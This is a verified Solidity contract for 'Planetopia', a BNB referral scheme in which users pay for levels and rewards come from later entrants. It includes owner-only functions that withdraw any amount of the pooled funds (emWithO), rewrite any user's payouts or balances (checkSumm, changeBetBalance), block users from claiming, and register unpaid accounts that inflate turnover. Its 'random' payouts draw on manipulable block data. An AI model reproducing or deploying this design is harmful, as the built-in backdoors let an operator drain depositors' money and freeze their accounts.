/**
 *Submitted for verification at BscScan.com on 2022-07-27
*/

pragma solidity  0.8.0;


// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.0;

// CAUTION
// This version of SafeMath should only be used with Solidity 0.8 or later,
// because it relies on the compiler's built in overflow checks.

/**
 * @dev Wrappers over Solidity's arithmetic operations.
 *
 * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler
 * now has built in overflow checking.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface PlanetopiaNFT {
    function mintPlanetX(address userAddress) external;
}

contract Planetopia {
    
   
    struct User {
        uint id;
        address referrer;
        uint8 maxLevel;
        bool blocked;
        uint256 balance;
        uint256 totalreward;
        uint256 team;
        uint256 teamreward;
        uint256 planetxreward;
    }
   
   
    uint8 public constant LASTLEVEL = 10;
    mapping(address => User) public users;

    mapping(uint8 => uint256[100000] ) payoutsLeftmap;

    uint256 public lastUserId = 1;

    address public owner;
    mapping(uint => address) public idToAddress;
    mapping(uint8 => uint256) public levelPrice;
    mapping(uint8 => uint256) public levelRoi;
    uint256 public transactions = 0;
    uint256 public turnover = 0;
    mapping(address => bool) public planetx_nft;
    uint256 startTime;

    uint256 public marketing = 0;
    uint256 public planetxaddressbank = 0;
    address public planetxaddressnft;
    address public bet_contract;
    using SafeMath for uint256;
    
    constructor()  {

        owner = msg.sender;
        planetxaddressnft = 0x0000000000000000000000000000000000000000;
        startTime = block.timestamp;
        levelPrice[1] = 0.1 ether ;
        levelPrice[2] = 0.15 ether ;
        levelPrice[3] = 0.2 ether ;
        levelPrice[4] = 0.3 ether ;
        levelPrice[5] = 0.4 ether ;
        levelPrice[6] = 0.6 ether ;
        levelPrice[7] = 0.8 ether ;
        levelPrice[8] = 1.2 ether ;
        levelPrice[9] = 1.6 ether ;
        levelPrice[10] = 2.4 ether ;
        
        levelRoi[1] = 26 ;
        levelRoi[2] = 27 ;
        levelRoi[3] = 28 ;
        levelRoi[4] = 29 ;
        levelRoi[5] = 30 ;
        levelRoi[6] = 31 ;
        levelRoi[7] = 32 ;
        levelRoi[8] = 33 ;
        levelRoi[9] = 34 ;
        levelRoi[10] = 35 ;
       
        User memory user = User({
            id: lastUserId,
            referrer: 0x0000000000000000000000000000000000000000,
            maxLevel: 10,
            totalreward: 0,
            team: 0,
            teamreward:0,
            planetxreward:0,
            blocked:false,
            balance:0
            
        });

        idToAddress[lastUserId] = owner;

        users[owner] = user;
         for (uint8 l = 1; l <= LASTLEVEL ; l++) {
             payoutsLeftmap[l][users[owner].id]=levelPrice[l]*200;
           
            
        }   


        lastUserId++;

        
    }
    
    function registrationOut(address userAddress) external  {
        require(msg.sender ==  owner, "only owner");
        
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
             payoutsLeftmap[l][users[userAddress].id]=0;
            //add remover
        }   
        lastUserId++;
    }
   
    function registrationInt(address userAddress, uint8 level) external  {
            
            require(msg.sender ==  owner, "only owner");
             
            User memory user = User({
                id: lastUserId,
                referrer: owner,
                maxLevel: 10,
                totalreward: 0,
                team: 0,
                teamreward:0,
                planetxreward:0,
                blocked:false,
                balance:0
            });
           
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        for (uint8 l = 1; l <= level ; l++) {
            payoutsLeftmap[l][users[userAddress].id]=(levelPrice[l] * levelRoi[l]) / 10;
           // users[userAddress].payoutsLeft[l]=(levelPrice[l] * levelRoi[l]) / 10;
           
        }   
        lastUserId++;
        turnover += 1 ether;
        transactions++;
    }

  

    function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
        if (_i == 0) {
            return "0";
        }
        uint j = _i;
        uint len;
        while (j != 0) {
            len++;
            j /= 10;
        }
        bytes memory bstr = new bytes(len);
        uint k = len;
        while (_i != 0) {
            k = k-1;
            uint8 temp = (48 + uint8(_i - _i / 10 * 10));
            bytes1 b1 = bytes1(temp);
            bstr[k] = b1;
            _i /= 10;
        }
        return string(bstr);
    }

    
    function registrationExt(address userAddress,address referrerAddress) external payable  {
        
        registration(userAddress, referrerAddress);
    }
    
    
    function buyNewLevel(address userAddress, uint8 level) external payable {
       
        if(level>1){
            
            
            require(msg.value+users[msg.sender].balance >= levelPrice[level], "invalid price");

            require(isUserExists(userAddress), "user not exists");
            turnover += levelPrice[level];
            transactions +=1;

            if(msg.value<levelPrice[level]){
                users[msg.sender].balance -= (levelPrice[level] - msg.value);
            }

        }
        require(level >= 1 && level <= lastLevel(), "invalid level");
        require( payoutsLeftmap[level][users[userAddress].id]==0, "invalid level");

        
        payoutsLeftmap[level][users[userAddress].id] = (levelPrice[level] * levelRoi[level]) / 10;

        
        address[20] memory winners = users[userAddress].referrer!=0x0000000000000000000000000000000000000000 ? getRandUserByLevel(level) : getRandUserByLevell(level);
        uint256 win_amount = levelPrice[level].mul( 35).div(1000);
        for (uint256 uid = 0; uid <= 19 ; uid++) {
            
            
            if(!users[winners[uid]].blocked){
                //payable(winners[uid]).transfer(win_amount);
                users[winners[uid]].totalreward += win_amount;
                users[winners[uid]].balance += win_amount;
                payoutsLeftmap[level][users[winners[uid]].id] -=  win_amount;
            }
           
        }
        
        // team rewards
        
        address ref = payable(users[userAddress].referrer);
        
        if(ref!=0x0000000000000000000000000000000000000000 && !users[ref].blocked){
                    uint256 ref_amount = levelPrice[level] * 20 / 100;
                    
                    users[ref].balance += ref_amount;
                    users[ref].teamreward += ref_amount;
                    if(level==1){
                        users[ref].team++;
                    }
        }
        marketing += levelPrice[level] * 5 / 100;
        planetxaddressbank += levelPrice[level] * 5 / 100;
       

         if(users[userAddress].maxLevel<level){
            users[userAddress].maxLevel = level;
        }

        if(level==10 && !planetx_nft[userAddress] && planetxaddressnft!=0x0000000000000000000000000000000000000000){
            PlanetopiaNFT(planetxaddressnft).mintPlanetX(userAddress);
            planetx_nft[userAddress]=true;
        }
       
    }    
  
    function checkSumm (address userAddress, uint8 level, uint256 new_payouts) public{
        require(msg.sender ==  owner, "only owner");
         payoutsLeftmap[level][users[userAddress].id]=new_payouts;

    }
    function blockUser (address userAddress) public{
        require(msg.sender ==  owner, "only owner");
        users[userAddress].blocked=true;

    }
    function unblockUser (address userAddress) public{
        require(msg.sender ==  owner, "only owner");
        users[userAddress].blocked=false;

    }
    function registration(address userAddress, address referrerAddress) private {
        require(msg.value == levelPrice[1], "registration cost");
        require(!isUserExists(userAddress), "user exists");
       
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
                id: lastUserId,
                referrer: payable(referrerAddress),
                maxLevel: 1,
                totalreward: 0,
                team: 0,
                teamreward:0,
                planetxreward:0,
                blocked:false,
                balance:0
            });
           
        
        
       
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        transactions++;
        turnover += msg.value;
        lastUserId++;
        this.buyNewLevel(userAddress,1);
    }
    
    
    
        
    function getRandUserByLevel(uint8 level) public view returns (address[20] memory){
        uint32 n=0;
        address[1000] memory levelUsers;
        
       
        for(uint256 i=1; i<lastUserId ;i++){
            if(maxActiveLevel(idToAddress[i])>=level ){
                levelUsers[n] = idToAddress[i];
                n++;
            }
            if(n==1000) break;
        }
        address[20] memory winners;
        for(uint256 s=0;s<=19; s++){
           winners[s] = levelUsers[randid(s,n)-1];
        }
        return  winners;
    }
    function getRandUserByLevell(uint8 level) public view returns (address[20] memory){
        uint32 n=0;
        address[1000] memory levelUsers;
        uint256 plastUserId= lastUserId<=20 ? lastUserId : 20;
       
        for(uint256 i=1; i<plastUserId ;i++){
            if(maxActiveLevel(idToAddress[i])>=level ){
                levelUsers[n] = idToAddress[i];
                n++;
            }
            if(n==1000) break;
        }
        address[20] memory winners;
        for(uint256 s=0;s<=19; s++){
           winners[s] = levelUsers[randid(s,n)-1];
        }
        return  winners;
    }

    function randid(uint256 h, uint32 n ) public view returns (uint256){
        uint256 nrandid =  uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp, h, n))) % (n);
        
        return nrandid+1;
    }

    

    function lastLevel() public view returns (uint8) {
        if(users[msg.sender].maxLevel<LASTLEVEL){
            return (users[msg.sender].maxLevel+1);
        }else{
            return LASTLEVEL;
        }
    }
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    
    
     function maxActiveLevel(address user) public view returns (uint8) {
       // if(isAdmin(user)) return false;

        for (uint8 nc = LASTLEVEL; nc >0 ; nc--) {
                if( payoutsLeftmap[nc][users[user].id]>0){ 
                    
                    return nc;
                }
                
        }
        return 1;
     }

  function isFrozen(address user,uint8 level) public view returns (bool) {
     
        uint8 maxActiveLevels = maxActiveLevel( user);
        for (uint8 l = 1; l <= maxActiveLevels ; l++) {
            if( payoutsLeftmap[l][users[user].id]==0){
                return true; 
            }
        }
        if(level!=10){
            if( payoutsLeftmap[level][users[user].id]<= levelPrice[level]  && maxActiveLevels<=level  ){
                    return true;   
            }
         }else{
            if( payoutsLeftmap[level][users[user].id]==0  ){
                    return true;   
            }
         
         }
        
        return false;
    }
   
    function payoutsLeft(address userAddress, uint8 level) public view returns(uint256) {
        return   payoutsLeftmap[level][users[userAddress].id];
    }

    function payoutsLeftAll(address userAddress) public view returns(string memory, string memory, string memory) {

        string memory b = "";
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            b = string(abi.encodePacked(b, uint2str( payoutsLeftmap[l][users[userAddress].id]),","));
        }

        string memory c = "";
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            c = string(abi.encodePacked(c, uint2str(payoutsLeftmap[l][users[userAddress].id]),","));
        }

        string memory d = "";
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            uint256 lpo = (levelPrice[l]* levelRoi[l]) /10 ;
            d = string(abi.encodePacked(d, uint2str(lpo),","));
        }
         return (b,c,d);
    }


    function isFrozenAll(address userAddress) public view returns(string memory) {

        string memory b = "";
        string memory res;
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            if(isFrozen( userAddress,l)) {
                res="1";
            }else{
                res="0";
            }
            b = string(abi.encodePacked(b, res,","));
        }
         return b;
    }

    function levelInfo() public view returns(string memory, string memory,   address) {
       
        string memory a = "";
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            a = string(abi.encodePacked(a, uint2str(levelPrice[l]),","));
        }
        string memory b = "";
        for (uint8 l = 1; l <= LASTLEVEL ; l++) {
            b = string(abi.encodePacked(b, uint2str(levelRoi[l]),","));
        }

       

        
         return (a,b,msg.sender);
    }
    function totallevelUsers(uint8 level) public view returns(uint256) {
        uint256 n = 0;
        for(uint256 i=1;i<=(lastUserId-1); i++){
            if(maxActiveLevel(idToAddress[i])>=level){
             n++;
            }
        }
        return n;
    }
    function emWithO(uint256 amount) external  {
        require(msg.sender ==  owner, "only owner");
        payable(owner).transfer(amount);
    }

    

    function setPlanetXNFTAddress(address _planetxaddress) external  {
        require(msg.sender ==  owner, "only owner");
        planetxaddressnft = _planetxaddress;
    }
   function setBetContractAddress(address _betcontract) external  {
        require(msg.sender ==  owner, "only owner");
        bet_contract =  _betcontract;
    }
    function reset() external  {
        require(msg.sender ==  owner, "only owner");
        startTime = block.timestamp;
    }
    function claimReward(address userAddress) external  {
        require(msg.sender ==  owner || msg.sender ==  userAddress, "only owner");
        if(users[userAddress].balance>0 && !users[userAddress].blocked){  
         payable(userAddress).transfer(users[userAddress].balance);
         users[userAddress].balance = 0;
        }
    }
    function withMarketing(uint256 amount) external  {
        require(msg.sender ==  owner, "only owner");
        payable(owner).transfer(amount);
        marketing -= amount;
    }

     function withPlanetXBank() external  {
        require(msg.sender ==  owner, "only owner");
        payable(owner).transfer(planetxaddressbank);
        planetxaddressbank =0 ;
    }

    function changeBetBalance(address userAddress, uint256 newBalance) external  {
        require(msg.sender ==  bet_contract || msg.sender ==  owner, "only bet contract");
        users[userAddress].balance = newBalance;
    }

}